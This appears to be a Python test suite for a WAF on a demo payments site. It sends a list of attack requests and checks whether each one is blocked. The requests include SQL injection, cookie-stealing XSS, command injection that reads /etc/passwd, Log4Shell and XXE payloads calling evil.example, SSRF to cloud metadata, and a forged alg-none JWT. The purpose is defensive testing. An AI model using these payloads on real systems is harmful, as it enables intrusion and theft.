#!/usr/bin/env python3
"""
Live WAF attack matrix for the payments fictionally.org demo.

Validates that the hardened policy on the secure host blocks (or correctly
monitors) every signature / v2 stage we ship, while the unprotected host
lets the same payloads through.

Defaults (override with env or flags):
  WAF_SECURE_HOST = https://payments-secure.fictionally.org
  WAF_OPEN_HOST   = https://payments.fictionally.org

Exit 0 only when every assertion passes. Designed for GitHub Actions
(workflow_dispatch + push to main) with zero third-party deps.
"""
from __future__ import annotations

import argparse
import base64
import json
import os
import ssl
import sys
import unittest
import urllib.error
import urllib.request
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import quote

CTX = ssl.create_default_context()

DEFAULT_SECURE = os.environ.get(
    "WAF_SECURE_HOST", "https://payments-secure.fictionally.org"
).rstrip("/")
DEFAULT_OPEN = os.environ.get(
    "WAF_OPEN_HOST", "https://payments.fictionally.org"
).rstrip("/")


def _b64url(obj: dict) -> str:
    return (
        base64.urlsafe_b64encode(json.dumps(obj, separators=(",", ":")).encode())
        .rstrip(b"=")
        .decode()
    )


FORGED_JWT = (
    f'{_b64url({"alg": "none", "typ": "JWT"})}.'
    f'{_b64url({"sub": "admin", "role": "admin"})}.'
)


def encode_path(path: str) -> str:
    """Percent-encode while preserving attack characters the WAF must see."""
    if "?" not in path:
        return quote(path, safe="/")
    p, q = path.split("?", 1)
    return quote(p, safe="/") + "?" + quote(
        q, safe="=&/:%*()[]{}$!,;@'\"<>|^~-._+"
    )


@dataclass
class Case:
    """One live HTTP assertion against the secure (and optionally open) host."""

    name: str
    rule_id: str  # expected X-WAF-Rule / violation id (or "none" for allow)
    method: str
    path: str
    expect: str = "block"  # block | allow | monitor
    body: Optional[str] = None
    headers: dict = field(default_factory=dict)
    # Alternate rule ids that are also acceptable (first-match races).
    alt_rules: tuple = ()
    # If False, skip the open-host control assertion (v2 stages / UA-only).
    check_open: bool = True
    content_type: Optional[str] = None
    notes: str = ""


# ── Full matrix: every rule in waf-policy-payments-hard ─────────────────────
# expect=monitor → signature fires in monitor mode only (no 403).
# expect=allow   → must NOT set X-WAF-Block (benign, staged, or business-logic).

CASES: list[Case] = [
    # SQLi (seed)
    Case("sqli-union", "waf-rule-sqli-001", "GET",
         "/products?cat=x' UNION SELECT * FROM users--"),
    Case("sqli-select-from", "waf-rule-sqli-002", "GET",
         "/products?cat=select id from users"),
    Case("sqli-insert", "waf-rule-sqli-003", "GET",
         "/products?cat=x'; INSERT INTO users VALUES(1)--"),
    Case("sqli-drop", "waf-rule-sqli-004", "GET",
         "/products?cat=x'; DROP TABLE users--"),
    Case("sqli-boolean", "waf-rule-sqli-005", "GET",
         "/products?cat=1 OR 1=1"),
    Case("sqli-comment-monitor", "waf-rule-sqli-006", "GET",
         "/products?cat=1-- ", expect="monitor",
         notes="seed rule action=monitor — must not hard-block alone"),
    Case("sqli-time", "waf-rule-sqli-007", "GET",
         "/products?cat=1; SELECT SLEEP(1)"),
    # XSS (seed)
    Case("xss-script", "waf-rule-xss-001", "GET",
         "/search?q=<script>alert(document.cookie)</script>"),
    Case("xss-javascript-uri", "waf-rule-xss-002", "GET",
         "/search?q=javascript:alert(1)"),
    Case("xss-event-handler", "waf-rule-xss-003", "GET",
         "/search?q=<img src=x onerror=alert(1)>"),
    Case("xss-html-tag-src", "waf-rule-xss-004", "GET",
         "/search?q=<img src=http://evil.example/x>"),
    Case("xss-dom-eval", "waf-rule-xss-005", "GET",
         "/search?q=eval(document.cookie)"),
    # Command injection (seed)
    Case("cmdi-semicolon", "waf-rule-cmdi-001", "GET",
         "/ping?host=127.0.0.1;id"),
    Case("cmdi-pipe", "waf-rule-cmdi-002", "GET",
         "/ping?host=127.0.0.1|cat /etc/passwd"),
    Case("cmdi-backtick", "waf-rule-cmdi-003", "GET",
         "/ping?host=`id`"),
    Case("cmdi-subshell", "waf-rule-cmdi-004", "GET",
         "/ping?host=$(whoami)"),
    # LFI / traversal (seed + demo)
    Case("lfi-dotdot", "waf-rule-lfi-001", "GET",
         "/statement?file=../../../../../../etc/passwd",
         alt_rules=("waf-rule-lfi-002", "waf-rule-lfi-003")),
    Case("lfi-passwd", "waf-rule-lfi-002", "GET",
         "/statement?file=/etc/passwd"),
    Case("lfi-encoded", "waf-rule-lfi-003", "GET",
         "/statement?file=..%2f..%2f..%2fetc/passwd",
         alt_rules=("waf-rule-lfi-001", "waf-rule-lfi-002")),
    # Protocol (seed)
    Case("proto-null-byte", "waf-rule-proto-001", "GET",
         "/products?cat=foo%00"),
    Case("proto-crlf", "waf-rule-proto-002", "GET",
         "/products?cat=x%0d%0aX-Injected:1"),
    # Modern / API (demo)
    Case("ssti-arithmetic", "waf-rule-ssti-001", "GET",
         "/render?tpl={{7*7}}"),
    Case("ssti-config", "waf-rule-ssti-001", "GET",
         "/render?tpl={{config}}"),
    Case("log4shell-jndi", "waf-rule-log4shell-001", "GET",
         "/lookup?user=${jndi:ldap://evil.example/a}"),
    Case("log4shell-obfuscated", "waf-rule-log4shell-002", "GET",
         "/lookup?user=${${lower:j}ndi:ldap://evil.example/a}"),
    Case("spring4shell", "waf-rule-spring4shell-001", "GET",
         "/bind?class.module.classLoader.URLs%5B0%5D=x"),
    Case("ssrf-metadata", "waf-rule-ssrf-001", "GET",
         "/fetch?url=http://169.254.169.254/latest/meta-data/"),
    Case("ssrf-gopher", "waf-rule-ssrf-002", "GET",
         "/fetch?url=gopher://127.0.0.1:70/1"),
    Case("nosqli", "waf-rule-nosqli-001", "POST",
         "/api/login", body='{"user":"admin","pass":{"$ne":null}}',
         content_type="application/json"),
    Case("xxe", "waf-rule-xxe-001", "POST",
         "/api/import",
         body='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
              '"http://evil.example/x">]><foo>&xxe;</foo>',
         content_type="application/xml"),
    Case("jwt-alg-none", "VIOL_JWT_ALG", "GET", "/api/me",
         headers={"Authorization": f"Bearer {FORGED_JWT}"},
         alt_rules=("waf-rule-jwt-none-001",),
         notes="v2 jwt.denyAlg usually wins before the signature rule"),
    Case("proto-pollution", "waf-rule-protopollute-001", "POST",
         "/api/merge", body='{"__proto__":{"admin":true}}',
         content_type="application/json"),
    Case("graphql-introspection", "waf-rule-graphql-introspection-001", "POST",
         "/graphql",
         body='{"query":"query IntrospectionQuery {__schema {types {name}}}"}',
         content_type="application/json"),
    Case("scanner-ua", "waf-rule-scanner-ua-001", "GET",
         "/products?cat=deposit",
         headers={"User-Agent": "sqlmap/1.7.11#stable (https://sqlmap.org)"}),
    Case("cmdi-json-chain", "waf-rule-cmdi-json-001", "POST",
         "/api/login", body='{"user":"a","pass":"x; id"}',
         content_type="application/json"),
    Case("mass-assignment", "waf-rule-massassign-001", "POST",
         "/api/profile", body='{"user":"me","role":"admin"}',
         content_type="application/json"),
    # Staged signature — alarm only until 2026-12-31
    Case("open-redirect-staged", "waf-rule-openredirect-001", "GET",
         "/products?redirect=https://evil.example/phish",
         expect="allow",
         notes="signature staged in policy until 2026-12-31 — must not hard-block"),
    # v2 stages
    Case("v2-filetype", "VIOL_FILETYPE", "GET", "/config.env",
         check_open=False),
    Case("v2-method", "VIOL_METHOD", "PUT", "/api/profile",
         body='{"user":"me"}', content_type="application/json",
         check_open=False),
    # Controls
    Case("benign-products", "none", "GET", "/products?cat=deposit",
         expect="allow"),
    Case("benign-home", "none", "GET", "/", expect="allow"),
    Case("bola-idor-business-logic", "none", "GET", "/api/accounts/9999",
         expect="allow",
         notes="signature WAF cannot stop object-level authz flaws"),
]


def fire(
    base: str,
    method: str,
    path: str,
    body: Optional[str],
    headers: dict,
    content_type: Optional[str],
) -> tuple[int, dict[str, str], str]:
    url = base.rstrip("/") + encode_path(path)
    data = body.encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    hdrs = {"User-Agent": headers.get("User-Agent", "waf-live-test/1.0")}
    hdrs.update(headers)
    if body is not None and "Content-Type" not in {k.title(): v for k, v in hdrs.items()}:
        # Preserve caller casing; set default if missing.
        if not any(k.lower() == "content-type" for k in hdrs):
            hdrs["Content-Type"] = content_type or (
                "application/json"
                if body.lstrip()[:1] in "{["
                else "application/xml"
            )
    for k, v in hdrs.items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=20, context=CTX) as resp:
            raw = resp.read(8192).decode("utf-8", "replace")
            return resp.status, {k.lower(): v for k, v in resp.headers.items()}, raw
    except urllib.error.HTTPError as e:
        raw = e.read(8192).decode("utf-8", "replace")
        return e.code, {k.lower(): v for k, v in e.headers.items()}, raw
    except Exception as e:
        return 0, {}, f"ERROR {e}"


def is_blocked(status: int, headers: dict[str, str]) -> bool:
    return status == 403 and headers.get("x-waf-block", "").lower() == "true"


def matched_rule(headers: dict[str, str]) -> str:
    return headers.get("x-waf-rule") or headers.get("x-waf-violation") or ""


class WafLiveTests(unittest.TestCase):
    secure = DEFAULT_SECURE
    open_host = DEFAULT_OPEN
    skip_open = False

    @classmethod
    def setUpClass(cls) -> None:
        # Connectivity smoke — fail fast if DNS/TLS is broken.
        # Prefer / over /health: payments.fictionally.org has no /health route.
        st, _, _ = fire(cls.secure, "GET", "/", None, {}, None)
        if st == 0:
            raise unittest.SkipTest(f"secure host unreachable: {cls.secure}")
        if not cls.skip_open:
            st2, _, _ = fire(cls.open_host, "GET", "/", None, {}, None)
            if st2 == 0:
                raise unittest.SkipTest(f"open host unreachable: {cls.open_host}")


def _make_test(case: Case):
    def test(self: WafLiveTests) -> None:
        st, hdrs, _body = fire(
            self.secure,
            case.method,
            case.path,
            case.body,
            case.headers,
            case.content_type,
        )
        blocked = is_blocked(st, hdrs)
        rule = matched_rule(hdrs)
        allowed = {case.rule_id, *case.alt_rules}

        if case.expect == "block":
            self.assertTrue(
                blocked,
                f"{case.name}: expected WAF block on secure, got "
                f"status={st} rule={rule!r} headers_waf="
                f"{ {k: v for k, v in hdrs.items() if k.startswith('x-waf')} }",
            )
            self.assertIn(
                rule,
                allowed,
                f"{case.name}: blocked by unexpected rule {rule!r}; "
                f"expected one of {sorted(allowed)}",
            )
        elif case.expect in ("allow", "monitor"):
            self.assertFalse(
                blocked,
                f"{case.name}: expected no hard block ({case.expect}"
                f"{'; - ' + case.notes if case.notes else ''}), "
                f"got status={st} rule={rule!r}",
            )
            if case.expect == "allow" and st == 0:
                self.fail(f"{case.name}: request error on secure host")

        if case.check_open and not self.skip_open and case.expect == "block":
            ost, ohdrs, _ = fire(
                self.open_host,
                case.method,
                case.path,
                case.body,
                case.headers,
                case.content_type,
            )
            self.assertFalse(
                is_blocked(ost, ohdrs),
                f"{case.name}: open host unexpectedly blocked "
                f"(status={ost} rule={matched_rule(ohdrs)!r}) — "
                f"control host must have WAF off",
            )

    test.__doc__ = f"{case.expect.upper()} {case.rule_id}: {case.name}"
    test.__name__ = f"test_{case.name.replace('-', '_')}"
    return test


for _case in CASES:
    setattr(WafLiveTests, f"test_{_case.name.replace('-', '_')}", _make_test(_case))


def main(argv: Optional[list[str]] = None) -> int:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument(
        "--secure",
        default=DEFAULT_SECURE,
        help="WAF-protected host (default: %(default)s)",
    )
    ap.add_argument(
        "--open",
        default=DEFAULT_OPEN,
        help="Unprotected control host (default: %(default)s)",
    )
    ap.add_argument(
        "--skip-open",
        action="store_true",
        help="Only assert against the secure host",
    )
    ap.add_argument("-v", "--verbose", action="store_true")
    args = ap.parse_args(argv)

    WafLiveTests.secure = args.secure.rstrip("/")
    WafLiveTests.open_host = args.open.rstrip("/")
    WafLiveTests.skip_open = args.skip_open

    suite = unittest.defaultTestLoader.loadTestsFromTestCase(WafLiveTests)
    result = unittest.TextTestRunner(
        verbosity=2 if args.verbose else 1, buffer=True
    ).run(suite)

    total = result.testsRun
    failed = len(result.failures) + len(result.errors)
    skipped = len(result.skipped)
    print(
        f"\nWAF live matrix: {total - failed - skipped}/{total} passed "
        f"({failed} failed, {skipped} skipped)\n"
        f"  secure = {WafLiveTests.secure}\n"
        f"  open   = {WafLiveTests.open_host}"
        f"{' (skipped)' if WafLiveTests.skip_open else ''}"
    )
    return 0 if result.wasSuccessful() else 1


if __name__ == "__main__":
    sys.exit(main())
